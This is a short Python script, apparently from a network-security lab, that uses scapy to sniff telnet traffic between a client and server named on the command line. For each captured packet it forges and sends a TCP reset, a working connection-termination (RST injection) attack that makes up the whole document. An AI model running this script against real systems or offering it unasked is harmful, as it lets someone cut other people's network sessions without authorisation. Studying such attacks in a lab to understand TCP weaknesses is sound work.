#! /usr/bin/python3
from scapy.all import *
import sys

def spoof(pkt):

    old_tcp = pkt[TCP]
    old_ip = pkt[IP]

    ip = IP(src=old_ip.dst, dst=old_ip.src)
    tcp= TCP(sport=old_tcp.dport, dport=old_tcp.sport, flags="R", seq=old_tcp.ack)

    pkt=ip/tcp
    ls(pkt)
    send(pkt,verbose=0)

client = sys.argv[1]
server = sys.argv[2]

myFilter = 'tcp and src host {} and dst host  {} and src port 23'.format(server,client)

print("Running rst attack")
print("Filter user: {}".format(myFilter))
print("Spoofing Reset packets form client ({}) to server ({})".format(client, server))


sniff(iface='eth0', filter=myFilter,prn=spoof)

